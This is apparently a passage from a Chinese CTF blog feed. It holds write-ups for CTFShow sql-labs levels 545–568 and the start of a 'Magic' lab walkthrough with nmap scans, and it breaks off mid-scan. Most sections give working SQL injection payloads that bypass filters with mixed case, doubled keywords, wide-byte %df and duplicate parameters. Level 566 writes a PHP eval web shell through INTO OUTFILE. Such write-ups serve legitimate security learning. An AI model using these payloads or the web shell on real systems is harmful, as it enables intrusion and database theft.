!= <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-545-过滤字符-union-select"><a href="#WEB-545-过滤字符-union-select" class="headerlink" title="WEB-545-过滤字符-union&amp;select"></a>WEB-545-过滤字符-<code>union</code>&amp;<code>select</code></h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out UNION</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out SELECT</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out Union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>union select 都可以用字母大小写交替绕过。</p><p>只过滤 +和&#x2F;**&#x2F;代表的空格，可以用 %09、%0D 等绕过对空格的过滤。</p><p>因为 - 、#会被过滤，所以使 ID 为一个非常大的数，闭合使用非注释方式</p><p>因为有报错，所以联合注入和报错注入都可以用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1000&#x27;or(updatexml(1,concat(0x7e,(SELEct(group_concat(flag4s))from(ctfshow.flags))),3))or&#x27;0<br><br>?id=1000&#x27;%09UnIoN%09SelEcT%091,(group_concat(flag4s)),3%09from%09ctfshow.flags;%00<br>//【这个联合注入闭合无法用】     &#x27;   or&#x27;0   or&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><h2 id="WEB-546-过滤字符-union-select"><a href="#WEB-546-过滤字符-union-select" class="headerlink" title="WEB-546-过滤字符-union&amp;select"></a>WEB-546-过滤字符-<code>union</code>&amp;<code>select</code></h2><p>和web-545一致，但是不反馈具体的报错，修改闭合方式为<code>&quot;</code>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1000&quot;%09UnIoN%09SelEcT%091,(group_concat(flag4s)),3%09from%09ctfshow.flags;%00<br>//【这个联合注入闭合无法用】     &#x27;   or&#x27;0   or&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure><h2 id="WEB-547-过滤字符-union-select"><a href="#WEB-547-过滤字符-union-select" class="headerlink" title="WEB-547-过滤字符-union&amp;select"></a>WEB-547-过滤字符-<code>union</code>&amp;<code>select</code></h2><p>过滤替换了一次<code>union select</code>，闭合方式是<code>&#39;)</code></p><p>绕过方式：使用双写进行绕过，或者使用盲注脚本（web-544）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1000&#x27;)%09ununion%09selection%09select%091,(group_concat(flag4s)),3%09from%09ctfshow.flags;%00<br><br>//经过过滤替换后，是<br>//?id=1000&#x27;) union select 1,(group_concat(flag4s)),3 from ctfshow.flags;%00<br></code></pre></td></tr></table></figure><h2 id="WEB-548-过滤字符-union-select"><a href="#WEB-548-过滤字符-union-select" class="headerlink" title="WEB-548-过滤字符-union&amp;select"></a>WEB-548-过滤字符-<code>union</code>&amp;<code>select</code></h2><p>字符型注入，闭合方式为<code>&#39;)</code></p><p>过滤替换了一次<code>union select</code>，连空格都不过滤了，payload不变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27;) ununion selection select 1,group_concat(flag4s),3 from ctfshow.flags--+<br></code></pre></td></tr></table></figure><h2 id="WEB-549-waf"><a href="#WEB-549-waf" class="headerlink" title="WEB-549-waf"></a>WEB-549-waf</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p>思路（代码逻辑漏洞导致的重复参数注入）：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一<span class="hljs-built_in">个id</span>值，如果我们有两<span class="hljs-built_in">个id</span>参数，第一<span class="hljs-built_in">个id</span>参数正常数字，第二<span class="hljs-built_in">个id</span>参数进行sql注入。<br><br>根据源代码，get提交的参数，如果重名，则以最后一个为准，所以sql语句在接受相同参数时候接受的是后面的参数值。<br>但是验<span class="hljs-built_in">证id</span>是否是数字却只是验证了第一<span class="hljs-built_in">个id</span>参数<br><br>其实第<span class="hljs-number">29</span>关（web549）是用jsp搭建的服务器，所以建议在电脑中安装Jspstudy来安装Jsp的环境。<br><br>构造两<span class="hljs-built_in">个id</span>参数，index.php<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-built_in">&amp;id</span>=<span class="hljs-number">2</span>，Apache PHP 会解析最后一个参数，Tomcat JSP 会解析第一个参数<br></code></pre></td></tr></table></figure><p>绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&amp;id=-2&#x27; union select 1,2,group_concat(flag4s) from ctfshow.flags--+<br></code></pre></td></tr></table></figure><h2 id="WEB-550-waf"><a href="#WEB-550-waf" class="headerlink" title="WEB-550-waf"></a>WEB-550-waf</h2><p>和上一题一致，只不过闭合方式修改为<code>&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&amp;id=-2&quot; union select 1,2,group_concat(flag4s) from ctfshow.flags--+<br></code></pre></td></tr></table></figure><h2 id="WEB-551-waf"><a href="#WEB-551-waf" class="headerlink" title="WEB-551-waf"></a>WEB-551-waf</h2><p>和上一题一致，只不过闭合方式修改为<code>&quot;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&amp;id=-2&quot;) union select 1,2,group_concat(flag4s) from ctfshow.flags--+<br></code></pre></td></tr></table></figure><h2 id="WEB-552-宽字节注入"><a href="#WEB-552-宽字节注入" class="headerlink" title="WEB-552-宽字节注入"></a>WEB-552-宽字节注入</h2><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">preg_quote</span>(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          <span class="hljs-comment">//escape any backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);                               <span class="hljs-comment">//escape single quote with a backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                <span class="hljs-comment">//escape double quote with a backslash</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用check_addslashes方法里面的preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id&#x3D;1’会变成id&#x3D;1&#39;（在’ “ \ 等敏感字符前面添加反斜杠）,使得引号不起作用。</p><p>但是可以注意到数据库使用了【gbk编码】。这里我们可以采用宽字节注入。</p><p>本题宽字节注入利用：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。具体利用的话我们可以用<span class="hljs-variable">%df</span> 吃掉 \（<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>）<br><br>因为urlencode(\&#x27;) <span class="hljs-operator">=</span> <span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span>，如果我们在 <span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span>前面添加 <span class="hljs-variable">%df</span>，形 成<span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 <span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>当做是一个汉字，<span class="hljs-variable">%27</span>(单引号)则作为一个单独的符号在外面，同时也就达到了我们的目的。<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-2%df&#x27;union select 1,2,group_concat(flag4s) from ctfshow.flags-- +<br></code></pre></td></tr></table></figure><h2 id="WEB-553-宽字节注入"><a href="#WEB-553-宽字节注入" class="headerlink" title="WEB-553-宽字节注入"></a>WEB-553-宽字节注入</h2><p>和上关过滤方式不同，本关使用PHP中的addslashes()函数，addslashes()函数作用是返回在预定义字符之前添加反斜杠的字符串.</p><p>payload不变：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-2%df&#x27;union select 1,2,group_concat(flag4s) from ctfshow.flags-- +<br></code></pre></td></tr></table></figure><h2 id="WEB-554-POST注入-宽字节注入"><a href="#WEB-554-POST注入-宽字节注入" class="headerlink" title="WEB-554-POST注入&amp;宽字节注入"></a>WEB-554-POST注入&amp;宽字节注入</h2><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">uname=admin%df&#x27;union select 1,group_concat(flag4s) from ctfshow.flags-- +<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/typora/202309181658362.png" alt="image-20230918165855997"></p><h2 id="WEB-555-联合注入"><a href="#WEB-555-联合注入" class="headerlink" title="WEB-555-联合注入"></a>WEB-555-联合注入</h2><p>数字型注入。用了addslashes()函数作为过滤，但是出flag并不需要单引号，相当于没过滤。</p><p>使用联合注入即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1 union select 1,2,flag4s from ctfshow.flags--+<br></code></pre></td></tr></table></figure><h2 id="WEB-556-宽字节注入"><a href="#WEB-556-宽字节注入" class="headerlink" title="WEB-556-宽字节注入"></a>WEB-556-宽字节注入</h2><p>过滤函数变成了<code>mysql_real_escape_string()</code>，作用和addslashes()函数一样。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-2%df&#x27;union select 1,2,group_concat(flag4s) from ctfshow.flags-- +<br></code></pre></td></tr></table></figure><h2 id="WEB-557-POST注入-宽字节注入"><a href="#WEB-557-POST注入-宽字节注入" class="headerlink" title="WEB-557-POST注入&amp;宽字节注入"></a>WEB-557-POST注入&amp;宽字节注入</h2><p>过滤函数是<code>mysql_real_escape_string()</code>。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">uname=-1%ef&#x27; and 1=2 union select 1,(select group_concat(flag4s) from ctfshow.flags)--+&amp;passwd=1&amp;submit=Submit<br>或者<br>uname=-1�&#x27; and 1=2 union select 1,(select group_concat(flag4s) from ctfshow.flags)--+&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><h2 id="WEB-558-堆叠注入-联合注入"><a href="#WEB-558-堆叠注入-联合注入" class="headerlink" title="WEB-558-堆叠注入&amp;联合注入"></a>WEB-558-堆叠注入&amp;联合注入</h2><p>字符型注入，闭合方式为<code>&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,2,group_concat(flag4s)from(ctfshow.flags)--+<br></code></pre></td></tr></table></figure><h2 id="WEB-559-堆叠注入-联合注入"><a href="#WEB-559-堆叠注入-联合注入" class="headerlink" title="WEB-559-堆叠注入&amp;联合注入"></a>WEB-559-堆叠注入&amp;联合注入</h2><p>数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1 union select 1,2,group_concat(flag4s)from(ctfshow.flags)--+<br></code></pre></td></tr></table></figure><h2 id="WEB-560-堆叠注入-联合注入"><a href="#WEB-560-堆叠注入-联合注入" class="headerlink" title="WEB-560-堆叠注入&amp;联合注入"></a>WEB-560-堆叠注入&amp;联合注入</h2><p>字符型注入，闭合方式为<code>&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27;) union select 1,2,group_concat(flag4s)from(ctfshow.flags)--+<br></code></pre></td></tr></table></figure><h2 id="WEB-561-堆叠注入-联合注入"><a href="#WEB-561-堆叠注入-联合注入" class="headerlink" title="WEB-561-堆叠注入&amp;联合注入"></a>WEB-561-堆叠注入&amp;联合注入</h2><p>数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1 union select 1,2,group_concat(flag4s)from(ctfshow.flags)--+<br></code></pre></td></tr></table></figure><h2 id="WEB-562-堆叠注入-报错注入"><a href="#WEB-562-堆叠注入-报错注入" class="headerlink" title="WEB-562-堆叠注入&amp;报错注入"></a>WEB-562-堆叠注入&amp;报错注入</h2><p>闭合方式为<code>&#39;</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">login_user=1&#x27;--+&amp;login_password=1000&#x27;or(updatexml(1,concat(0x7e,(SELEct(group_concat(flag4s))from(ctfshow.flags))),3))--+&amp;mysubmit=Login<br></code></pre></td></tr></table></figure><h2 id="WEB-563-堆叠注入-报错注入"><a href="#WEB-563-堆叠注入-报错注入" class="headerlink" title="WEB-563-堆叠注入&amp;报错注入"></a>WEB-563-堆叠注入&amp;报错注入</h2><p>和web-562一致，但闭合方式为<code>&#39;)</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">login_user=1&#x27;)--+&amp;login_password=1000&#x27;)or(updatexml(1,concat(0x7e,(SELEct(group_concat(flag4s))from(ctfshow.flags))),3))--+&amp;mysubmit=Login<br></code></pre></td></tr></table></figure><h2 id="WEB-564-报错注入"><a href="#WEB-564-报错注入" class="headerlink" title="WEB-564-报错注入"></a>WEB-564-报错注入</h2><p>数字型注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?sort=1 AND EXTRACTVALUE(1,(CONCAT(0x7e,(select group_concat(flag4s)from(ctfshow.flags)),0x7e)))-- +<br></code></pre></td></tr></table></figure><h2 id="WEB-565-报错注入"><a href="#WEB-565-报错注入" class="headerlink" title="WEB-565-报错注入"></a>WEB-565-报错注入</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?sort=1&#x27; AND EXTRACTVALUE(1,(CONCAT(0x7e,(select group_concat(flag4s)from(ctfshow.flags)),0x7e)))-- +<br></code></pre></td></tr></table></figure><h2 id="WEB-566-写入shell"><a href="#WEB-566-写入shell" class="headerlink" title="WEB-566-写入shell"></a>WEB-566-写入shell</h2><p>shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?sort=1 into outfile &quot;/var/www/html/x2.php&quot; lines terminated by &#x27;&lt;?php eval($_POST[x]); ?&gt;&#x27;<br></code></pre></td></tr></table></figure><p>写入shell后使用蚁剑进行连接，查找到数据库的配置文件，找到数据库的用户名和密码，然后对数据库进行连接，查找flag</p><h2 id="WEB-567-报错注入"><a href="#WEB-567-报错注入" class="headerlink" title="WEB-567-报错注入"></a>WEB-567-报错注入</h2><p>数字型注入</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?sort=1 AND EXTRACTVALUE(1,(CONCAT(0x7e,(select group_concat(flag4s)from(ctfshow.flags)),0x7e)))-- +<br></code></pre></td></tr></table></figure><h2 id="WEB-568-报错注入"><a href="#WEB-568-报错注入" class="headerlink" title="WEB-568-报错注入"></a>WEB-568-报错注入</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?sort=1&#x27; AND EXTRACTVALUE(1,(CONCAT(0x7e,(select group_concat(flag4s)from(ctfshow.flags)),0x7e)))-- +<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>1、Y4tacker：<a href="https://blog.csdn.net/solitudi/article/details/115534124">https://blog.csdn.net/solitudi/article/details/115534124</a></p><p>2、全_Jay 17：<a href="https://blog.csdn.net/Jayjay___/article/details/132010298">https://blog.csdn.net/Jayjay___/article/details/132010298</a></p>]]></content>
    
    
    <categories>
      
      <category>CTFShow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB入门</tag>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Magic</title>
    <link href="/Maze-sec/Magic/"/>
    <url>/Maze-sec/Magic/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 21:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00019s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00025s latency).<br>MAC Address: 08:00:27:C5:9D:B8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.61<br>Host is up (0.0012s latency).<br>MAC Address: 08:00:27:43:16:2D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.02 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.61</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# nmap --min-rate 10000 -p- 192.168.2.61                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 21:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.61<br>Host is up (0.00041s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:43:16:2D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 4.48 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80,139,445</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/magic]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,139,445 192.168.2.61<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 21:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.61<br>Host is up (0.00073s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp  open  http        Apache httpd 2.4.62 ((Debian))<br>|_http-title: XML Processor<br>|_http-server-header: Apache/2.4.62 (Debian)<br>139/tcp open  netbios-ssn Samba smbd 4.6.2<br>445/tcp open  netbios-ssn Samba smbd 4.6.2<br>MAC Address: 08:00:27:43:16:2D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2025-07-22T13:09:49<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>|_clock-skew: -1s<br>|_nbstat: NetBIOS name: MAGIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.06 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 